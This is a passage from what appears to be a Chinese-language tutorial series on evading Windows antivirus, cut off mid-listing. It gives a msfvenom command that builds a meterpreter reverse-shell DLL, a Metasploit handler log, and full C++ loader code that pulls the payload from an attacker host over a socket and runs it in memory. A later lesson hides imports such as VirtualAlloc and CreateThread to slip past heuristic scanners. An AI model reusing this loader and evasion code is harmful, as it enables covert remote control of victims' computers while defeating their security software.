class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;</span><br><span class="line">HMODULE  hBadCode = LoadLibrary(TEXT(<span class="string">&quot;BadCode-DLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">RunMsg = (msg)GetProcAddress(hBadCode,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">RunMsg();</span><br><span class="line">FreeLibrary(hBadCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p><p>接下来贴上MemoryModule的使用方法：</p><ol><li>将要加载的PE文件读入内存</li><li>初始化MemoryModule句柄</li><li>装载内存</li><li>获得导出函数地址</li><li>执行导出函数</li><li>释放MemoryModule句柄</li></ol><p>这里我将MemoryModule项目代码放入当前项目：</p><p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;  <span class="comment">// msg函数的函数指针</span></span><br><span class="line">HMEMORYMODULE hModule; <span class="comment">// MemoryModule句柄，应该可以这么理解,,</span></span><br><span class="line">HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; <span class="comment">// 打开PE文件的句柄</span></span><br><span class="line">WCHAR szBadCodeFile[] = TEXT(<span class="string">&quot;C:\Users\admin\Documents\Visual Studio 2012\Projects\BadCode\Debug\BadCode-DLL.dll&quot;</span>); <span class="comment">// PE文件的物理路径</span></span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>; <span class="comment">// PE文件大小</span></span><br><span class="line">DWORD dwReadOfFileSize = <span class="number">0</span>; <span class="comment">// 已读取的PE文件大小</span></span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>; <span class="comment">// PE文件的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);</span><br><span class="line"><span class="comment">// 如果打开失败直接退出</span></span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 申请放置PE文件的内存空间</span></span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line">ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 如果读取错误直接退出</span></span><br><span class="line"><span class="keyword">if</span>(dwReadOfFileSize != dwFileSize)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭打开PE文件的句柄</span></span><br><span class="line">CloseHandle(hBadCodeDll);</span><br><span class="line"><span class="comment">// 导入PE文件</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// 如果加载失败，就退出</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">RunMsg = (msg)MemoryGetProcAddress(hModule,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line"><span class="comment">// 运行msg函数</span></span><br><span class="line">RunMsg();</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// 释放PE内存</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反射DLL-与-MSF-联动"><a href="#反射DLL-与-MSF-联动" class="headerlink" title="反射DLL 与 MSF 联动"></a>反射DLL 与 MSF 联动</h2><blockquote><p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p></blockquote><p>生成DLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.170.138 LPORT&#x3D;8899 -f dll -o ~&#x2F;y.dll</span><br></pre></td></tr></table></figure><p>设置MSF dll 发射器(set DLL 命令)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.170.138 -P 8899</span><br><span class="line">[*] Payload handler running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8899 </span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.170.138 </span><br><span class="line">LHOST &#x3D;&gt; 192.168.170.138</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 8888</span><br><span class="line">LPORT &#x3D;&gt; 8888</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set DLL ~&#x2F;y.dll</span><br><span class="line">DLL &#x3D;&gt; ~&#x2F;y.dll</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8888 </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br></pre></td></tr></table></figure><p>写代码实现客户端获，获取MSF 生成的DLL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*Module)</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetPEDLL</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD dwError;</span><br><span class="line">WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET socks;</span><br><span class="line">SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line"><span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.138&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">2650</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ZeroMemory(bFileBuffer,PAYLOAD_SIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">5120</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(socks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HMEMORYMODULE hModule;</span><br><span class="line">Module DllMain;</span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[PAYLOAD_SIZE];</span><br><span class="line">GetPEDLL();</span><br><span class="line"><span class="comment">// 导入PE文件</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// 如果加载失败，就退出</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">DllMain = (Module)MemoryGetProcAddress(hModule,<span class="string">&quot;DllMain&quot;</span>);</span><br><span class="line"><span class="comment">// 运行msg函数</span></span><br><span class="line">DllMain(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">DWORD dwThread;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;dwThread);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE);</span><br><span class="line"></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// 释放PE内存</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p><p>PS:</p><p>不同位数要对应不同的payload，编译平台也要互相对应</p><p>引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p><h1 id="第7课"><a href="#第7课" class="headerlink" title="第7课"></a>第7课</h1><h2 id="导入地址表（IAT）"><a href="#导入地址表（IAT）" class="headerlink" title="导入地址表（IAT）"></a>导入地址表（IAT）</h2><blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220160321.png"></p><p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。</p><p>如果一个文件的文件大小在300KB以内，并且导入函数又有<code>Virtual Alloc</code>、<code>CreateThread</code>，且<code>VirtualAlloc</code>的最后一个参数是<code>0x40</code>，那么此文件是高危文件。</p><p><code>0x40</code>被定义在<code>winnt.h</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define PAGE_NOACCESS           0x01    </span><br><span class="line">#define PAGE_READONLY           0x02    </span><br><span class="line">#define PAGE_READWRITE          0x04    </span><br><span class="line">#define PAGE_WRITECOPY          0x08    </span><br><span class="line">#define PAGE_EXECUTE            0x10    </span><br><span class="line">#define PAGE_EXECUTE_READ       0x20    </span><br><span class="line">#define PAGE_EXECUTE_READWRITE  0x40    </span><br><span class="line">#define PAGE_EXECUTE_WRITECOPY  0x80  </span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210220161431763.png)</p><h2 id="GetProcAddress-获取函数地址"><a href="#GetProcAddress-获取函数地址" class="headerlink" title="GetProcAddress 获取函数地址"></a>GetProcAddress 获取函数地址</h2><p><code>GetProcAddress</code>这个API在<code>Kernel32.dll</code>中被导出，主要功能是从一个加载的模块中获取函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule, <span class="comment">// 模块句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName <span class="comment">// 函数名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>FARPROC</code>被定义在了<code>minwindef.h</code>中，声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WINAPI      __stdcall</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(FAR WINAPI *FARPROC)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>跟进它的声明能够发现是一个函数指针，也就是说<code>GetProcAddress</code>返回的是我们要找的函数地址。</p><h2 id="自己写代码获取函数地址"><a href="#自己写代码获取函数地址" class="headerlink" title="自己写代码获取函数地址"></a>自己写代码获取函数地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject</span><br></pre></td></tr></table></figure><p>这几个函数是比较明显的，并且都在<code>kernel32.dll</code>中导出，我们尝试自己定义他们的函数指针，然后利用<code>GetProcAddress</code>获取函数地址，调用自己的函数名称。</p><p>新建C/C++项目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI * ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>然后在<code>main</code>函数中，定义四个函数指针来存放这些函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 